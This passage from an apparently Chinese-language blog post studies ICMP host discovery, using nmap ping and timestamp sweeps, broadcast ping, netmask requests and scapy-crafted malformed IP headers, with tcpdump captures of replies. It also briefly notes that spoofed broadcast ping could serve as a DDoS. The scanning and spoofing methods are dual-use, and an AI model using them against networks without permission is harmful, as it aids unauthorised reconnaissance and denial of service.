 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612681</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.5</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">52004</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612689</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.6</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">50499</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612705</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.7</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">49428</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612725</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.11</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">36</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612732</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.12</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">44368</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612745</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.30</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">34029</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.612750</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.31</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">8416</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708321</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.17</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">22579</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708327</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.18</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">44220</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708331</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.20</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">9032</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708343</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.21</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">35831</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708347</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.22</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">2301</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708350</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.23</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">38652</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708353</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.24</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">48909</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.708356</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.25</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">56868</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.710492</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.26</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">11131</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.710505</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.27</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">21052</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.710515</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.28</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">51363</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.710518</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.29</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">64922</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.710521</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.14</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">38360</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.710527</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.16</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">40280</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.710531</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.15</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">22775</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.712621</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.2</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">14586</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.712632</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.3</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">52979</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.712639</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.4</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">55009</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.712646</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.8</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">48655</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.712652</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.9</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">12270</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.712657</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.10</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">52019</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.811539</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.14</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">38654</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.811554</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.15</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">36060</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.811559</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.16</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">54453</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.811564</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.26</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">58198</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.811569</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.27</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">58807</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.811574</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.28</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">25994</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.811578</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.29</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">43528</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span></span>
</code></pre><p>看样子ping扫射时发了一个<code>ICMP echo request</code>不过瘾，又发了一次<code>ICMP time stamp query</code>。</p>
<p>广播ping也可以试着找出局域网内的机器。但通常windows机器都不会响应，安卓也不会响应地址是广播地址的ICMP echo request。</p>
<p>我们还可以看看广播地址的icmp echo request</p>
<p>如果伪造发送者ip，ping广播地址可以是潜在的DDOS。</p>
<pre><code> ~ ⮀ ping -b <span class="number">192.168</span><span class="number">.1</span><span class="number">.255</span>
WARNING: pinging broadcast address
PING <span class="number">192.168</span><span class="number">.1</span><span class="number">.255</span> (<span class="number">192.168</span><span class="number">.1</span><span class="number">.255</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of data.
<span class="number">64</span> bytes from <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">83.8</span> ms
<span class="number">64</span> bytes from <span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">87.6</span> ms (DUP!)
</code></pre><p>额……发现两个iphone。。。</p>
<pre><code> ~ ⮀ sudo nmap -sS <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span>

Starting Nmap <span class="number">6.25</span> ( <span class="string">http:</span><span class="comment">//nmap.org ) at 2014-03-15 14:34 CST</span>
Nmap scan report <span class="keyword">for</span> localhost (<span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span>)
Host is up (<span class="number">0.0040</span>s latency).
Not <span class="string">shown:</span> <span class="number">999</span> closed ports
PORT      STATE SERVICE
<span class="number">62078</span>/tcp open  iphone-sync
MAC <span class="string">Address:</span> <span class="string">F1:</span><span class="string">DD:</span><span class="number">08</span>:<span class="string">AF:</span><span class="string">CB:</span>E9 (Unknown)

Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">41.44</span> seconds

 ~ ⮀ sudo nmap -sS <span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span>

Starting Nmap <span class="number">6.25</span> ( <span class="string">http:</span><span class="comment">//nmap.org ) at 2014-03-15 14:37 CST</span>
Nmap scan report <span class="keyword">for</span> localhost (<span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span>)
Host is up (<span class="number">0.0053</span>s latency).
Not <span class="string">shown:</span> <span class="number">999</span> closed ports
PORT      STATE SERVICE
<span class="number">62078</span>/tcp open  iphone-sync
MAC <span class="string">Address:</span> <span class="number">83</span>:<span class="number">48</span>:<span class="number">4</span><span class="string">C:</span><span class="string">DD:</span><span class="number">5</span><span class="string">B:</span><span class="number">96</span> (Unknown)

Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">42.11</span> seconds
</code></pre><p>但安卓就不对广播ICMP request echo响应了。可以参考著名的<a href="http://althing.cs.dartmouth.edu/local/ICMP_Scanning_v3.0.pdf" target="_blank" rel="external">ICMP Usage in<br> Scanning</a>，很详细的文档，虽然年头早了些。</p>
<h2 id="ICMP_Timestamp_query">ICMP Timestamp query</h2><p>接下来试试timestamp request</p>
<pre><code> ~ ⮀ sudo nmap -sP -PP --disable-arp-ping bbs<span class="class">.byr</span><span class="class">.cn</span>

Starting Nmap <span class="number">6.25</span> ( http:<span class="comment">//nmap.org ) at 2014-03-15 14:48 CST</span>
Nmap scan report <span class="keyword">for</span> bbs<span class="class">.byr</span><span class="class">.cn</span> (<span class="number">123.127</span>.<span class="number">134.62</span>)
Host is up (<span class="number">0.0044s</span> latency).
Nmap done: <span class="number">1</span> IP <span class="tag">address</span> (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.23</span> seconds

<span class="number">15</span>:<span class="number">02</span>:<span class="number">20.679449</span> IP <span class="number">10.109</span>.<span class="number">20.127</span> &gt; <span class="number">10.3</span>.<span class="number">18.66</span>: ICMP <span class="tag">time</span> stamp query id <span class="number">6291</span> seq <span class="number">0</span>, length <span class="number">20</span>
<span class="number">15</span>:<span class="number">02</span>:<span class="number">20.682487</span> IP <span class="number">10.3</span>.<span class="number">18.66</span> &gt; <span class="number">10.109</span>.<span class="number">20.127</span>: ICMP <span class="tag">time</span> stamp reply id <span class="number">6291</span> seq <span class="number">0</span>: org <span class="number">00</span>:<span class="number">00</span>:<span class="number">00.000</span>, recv <span class="number">07</span>:<span class="number">09</span>:<span class="number">19.107</span>, xmit <span class="number">07</span>:<span class="number">09</span>:<span class="number">19.107</span>, length <span class="number">20</span>
</code></pre><p>不是所有的机器都会响应。</p>
<pre><code> ~ ⮀ sudo nmap -<span class="variable">sP</span> -PP <span class="comment">--disable-arp-ping 10.109.20.1</span>

Starting Nmap <span class="number">6.25</span> ( <span class="keyword">http</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2014</span>-<span class="number">03</span>-<span class="number">15</span> <span class="number">15</span>:<span class="number">00</span> CST
Note: Host seems down. If <span class="keyword">it</span> is really up, but blocking our ping probes, <span class="keyword">try</span> -Pn
Nmap done: <span class="number">1</span> IP address (<span class="number">0</span> hosts up) scanned <span class="operator">in</span> <span class="number">2.20</span> <span class="built_in">seconds</span>


<span class="number">15</span>:<span class="number">00</span>:<span class="number">53.309360</span> IP <span class="number">10.109</span><span class="number">.20</span><span class="number">.127</span> &gt; <span class="number">10.109</span><span class="number">.20</span><span class="number">.1</span>: ICMP <span class="built_in">time</span> stamp query id <span class="number">48585</span> seq <span class="number">0</span>, <span class="built_in">length</span> <span class="number">20</span>
<span class="number">15</span>:<span class="number">00</span>:<span class="number">54.310449</span> IP <span class="number">10.109</span><span class="number">.20</span><span class="number">.127</span> &gt; <span class="number">10.109</span><span class="number">.20</span><span class="number">.1</span>: ICMP <span class="built_in">time</span> stamp query id <span class="number">60795</span> seq <span class="number">0</span>, <span class="built_in">length</span> <span class="number">20</span>
</code></pre><h2 id="ICMP_address_netmask_request">ICMP address netmask request</h2><p>这是个已经废弃的东西，现在推荐使用dhcp，不过看学校的一些路由器还是支持的</p>
<pre><code> ~ ⮀ sudo nmap -sP -PM <span class="comment">--disable-arp-ping 10.109.20.1</span>

Starting Nmap 6.25 ( http://nmap.org ) at 2014-03-15 14:59 CST
Nmap scan report for 10.109.20.1
Host is up (0.0025s latency).
MAC Address: 00:00:E0:60:00:00 (Hangzhou H3C Technologies Co.)
Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds


✘ ⮀ ~ ⮀ sudo tcpdump -i wlan0 "icmp"
tcpdump: verbose output suppressed, <span class="operator"><span class="keyword">use</span> -v <span class="keyword">or</span> -vv <span class="keyword">for</span> <span class="keyword">full</span> protocol <span class="keyword">decode</span>
listening <span class="keyword">on</span> wlan0, <span class="keyword">link</span>-<span class="keyword">type</span> EN10MB (Ethernet), capture <span class="keyword">size</span> <span class="number">65535</span> <span class="keyword">bytes</span>
<span class="number">14</span>:<span class="number">59</span>:<span class="number">49.589370</span> IP <span class="number">10.109</span><span class="number">.20</span><span class="number">.127</span> &gt; <span class="number">10.109</span><span class="number">.20</span><span class="number">.1</span>: ICMP address <span class="keyword">mask</span> request, <span class="keyword">length</span> <span class="number">12</span>
<span class="number">14</span>:<span class="number">59</span>:<span class="number">49.591828</span> IP <span class="number">10.109</span><span class="number">.20</span><span class="number">.1</span> &gt; <span class="number">10.109</span><span class="number">.20</span><span class="number">.127</span>: ICMP address <span class="keyword">mask</span> <span class="keyword">is</span> <span class="number">0xfffffc00</span>, <span class="keyword">length</span> <span class="number">12</span></span>
</code></pre><p>谁会响应我们的非echo ICMP请求？</p>
<ul>
<li>监听状态的机器。</li>
<li>实现这个标准的操作系统。</li>
<li>配置为支持这个ICMP请求。</li>
<li>没有被防火墙墙掉。</li>
</ul>
<p>大多数机器对折中非echo的ICMP请求是没响应的。</p>
<pre><code>~ ⮀ sudo nmap -<span class="literal">sP</span> -PM/E/P --disable-arp-ping <span class="number">10</span>.<span class="number">109</span>.<span class="number">23</span>.<span class="number">255</span>

<span class="label">Starting</span> Nmap <span class="number">6</span>.<span class="number">25</span> ( http://nmap.org ) at <span class="number">2014</span>-<span class="number">03</span>-<span class="number">15</span> <span class="number">15</span>:<span class="number">07</span> CST
<span class="label">Note</span>: Host seems down. <span class="preprocessor">If</span> <span class="keyword">it </span>is really up, <span class="keyword">but </span><span class="keyword">blocking </span>our ping probes, try -Pn
<span class="label">Nmap</span> done: <span class="number">1</span> <span class="literal">IP</span> <span class="keyword">address </span>(<span class="number">0</span> hosts up) scanned in <span class="number">2</span>.<span class="number">18</span> seconds
</code></pre><h2 id="ICMP_Parameter_Problem_Error_messages">ICMP Parameter Problem Error messages</h2><p>让目标机器生成ICMP参数错误消息的方法有：</p>
<ul>
<li>搞乱IP头：<ul>
<li>头长度域</li>
<li>IP报文option部分</li>
</ul>
</li>
<li>在IP头中使用无效的域值<ul>
<li>在IP头中使用有效的域值</li>
</ul>
</li>
<li>滥用分片</li>
<li>UDP扫描主机探测方法。</li>
</ul>
<p>IP中伪造而不会被无声丢弃的域：</p>
<ul>
<li>ihl</li>
<li>option</li>
<li>proto尝试不使用的</li>
</ul>
<p>我们先试试改头长度域的：</p>
<p>我们造个ihl有问题的包(<code>ihl</code>的值是32位即一个字的个数)：</p>
<pre><code> ~ ⮀ sudo scapy
<span class="constant">Welcome</span> to <span class="constant">Scapy</span> (<span class="number">2.2</span>.<span class="number">0</span>)
<span class="prompt">&gt;&gt;</span>&gt; ip = <span class="constant">IP</span>()/<span class="constant">ICMP</span>()
<span class="prompt">&gt;&gt;</span>&gt; ip.dst=<span class="string">'10.3.18.66'</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.ihl=<span class="number">6</span>L
<span class="prompt">&gt;&gt;</span>&gt; ip.show()
<span class="comment">###[ IP ]###</span>
  version= <span class="number">4</span>
  ihl= <span class="number">6</span>L
  tos= <span class="number">0x0</span>
  len= <span class="constant">None</span>
  id= <span class="number">1</span>
  flags= 
  frag= <span class="number">0</span>
  ttl= <span class="number">64</span>
  proto= icmp
  chksum= <span class="constant">None</span>
  src= <span class="number">10.210</span>.<span class="number">96.200</span>
  dst= <span class="number">10.3</span>.<span class="number">18.66</span>
  \options\
<span class="comment">###[ ICMP ]###</span>
     type= echo-request
     code= <span class="number">0</span>
     chksum= <span class="constant">None</span>
     id= <span class="number">0x0</span>
     seq= <span class="number">0x0</span>
<span class="prompt">&gt;&gt;</span>&gt; send(ip)
.
<span class="constant">Sent</span> <span class="number">1</span> packets.

<span class="symbol">tcpdump:</span> verbose output suppressed, use -v <span class="keyword">or</span> -vv <span class="keyword">for</span> full protocol decode
listening on eth<span class="number">0</span>, link-type <span class="constant">EN10MB</span> (<span class="constant">Ethernet</span>), capture size <span class="number">65535</span> bytes
<span class="number">14</span><span class="symbol">:</span><span class="number">45</span><span class="symbol">:</span><span class="number">29.035948</span> <span class="constant">IP</span> <span class="number">10.210</span>.<span class="number">96.200</span> &gt; <span class="number">10.3</span>.<span class="number">18.66</span><span class="symbol">:</span> [|icmp]
<span class="number">14</span><span class="symbol">:</span><span class="number">45</span><span class="symbol">:</span><span class="number">29.039536</span> <span class="constant">IP</span> <span class="number">10.210</span>.<span class="number">96.193</span> &gt; <span class="number">10.210</span>.<span class="number">96.200</span><span class="symbol">:</span> <span class="constant">ICMP</span> parameter problem - octet <span class="number">21</span>, length <span class="number">12</span>
</code></pre><p>为啥会参数错误，因为解析包的程序会把ICMP报文部分当成options处理。</p>
<p>同样，我们往options部分塞些奇奇怪怪的东西也可以完成同样效果。</p>
<pre><code> ~ ⮀ sudo scapy
<span class="constant">Welcome</span> to <span class="constant">Scapy</span> (<span class="number">2.2</span>.<span class="number">0</span>)
<span class="prompt">&gt;&gt;</span>&gt; ip = <span class="constant">IP</span>()/<span class="constant">ICMP</span>()
<span class="prompt">&gt;&gt;</span>&gt; ip.dst=<span class="string">'10.3.18.66'</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.show()
<span class="comment">###[ IP ]###</span>
  version= <span class="number">4</span>
  ihl= <span class="constant">None</span>
  tos= <span class="number">0x0</span>
  len= <span class="constant">None</span>
  id= <span class="number">1</span>
  flags= 
  frag= <span class="number">0</span>
  ttl= <span class="number">64</span>
  proto= icmp
  chksum= <span class="constant">None</span>
  src= <span class="number">10.210</span>.<span class="number">96.200</span>
  dst= <span class="number">10.3</span>.<span class="number">18.66</span>
  \options\
   |<span class="comment">###[ IPOption ]###</span>
   |  copy_flag= <span class="number">1</span>
   |  optclass= control
   |  option= extended_security
   |  length= <span class="constant">None</span>
   |  value= <span class="string">''</span>
<span class="comment">###[ ICMP ]###</span>
     type= echo-request
     code= <span class="number">0</span>
     chksum= <span class="constant">None</span>
     id= <span class="number">0x0</span>
     seq= <span class="number">0x0</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.options=<span class="constant">IPOption</span>(copy_flag=<span class="number">1</span>,optclass=<span class="number">0</span>,option=<span class="number">5</span>,value=<span class="string">''</span>)
<span class="prompt">&gt;&gt;</span>&gt; send(ip)
</code></pre><p>大快人心的是途中的路由返回的参数错误</p>
<pre><code> ~ ⮀ <span class="tag">sudo</span> <span class="tag">tcpdump</span> <span class="tag">-i</span> <span class="tag">eth0</span> "<span class="tag">icmp</span>"
 <span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
 <span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
 15<span class="pseudo">:13</span><span class="pseudo">:30</span><span class="class">.787605</span> <span class="tag">IP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span> &gt; 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span>: <span class="tag">ICMP</span> <span class="tag">echo</span> <span class="tag">request</span>, <span class="tag">id</span> 0, <span class="tag">seq</span> 0, <span class="tag">length</span> 8
 15<span class="pseudo">:13</span><span class="pseudo">:30</span><span class="class">.790656</span> <span class="tag">IP</span> 10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">parameter</span> <span class="tag">problem</span> <span class="tag">-</span> <span class="tag">octet</span> 20, <span class="tag">length</span> 40

 ~ ⮀ <span class="tag">traceroute</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> 
<span class="tag">traceroute</span> <span class="tag">to</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> (10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span>), 30 <span class="tag">hops</span> <span class="tag">max</span>, 60 <span class="tag">byte</span> <span class="tag">packets</span>
 1  10<span class="class">.210</span><span class="class">.96</span><span class="class">.193</span> (10<span class="class">.210</span><span class="class">.96</span><span class="class">.193</span>)  2<span class="class">.537</span> <span class="tag">ms</span>  2<span class="class">.798</span> <span class="tag">ms</span>  3<span class="class">.158</span> <span class="tag">ms</span>
 2  10<span class="class">.1</span><span class="class">.10</span><span class="class">.1</span> (10<span class="class">.2</span><span class="class">.100</span><span class="class">.1</span>)  1<span class="class">.260</span> <span class="tag">ms</span>  1<span class="class">.423</span> <span class="tag">ms</span>  1<span class="class">.425</span> <span class="tag">ms</span>
 3  10<span class="class">.1</span><span class="class">.2</span><span class="class">.1</span> (10<span class="class">.2</span><span class="class">.1</span><span class="class">.1</span>)  0<span class="class">.824</span> <span class="tag">ms</span>  1<span class="class">.197</span> <span class="tag">ms</span>  1<span class="class">.614</span> <span class="tag">ms</span>
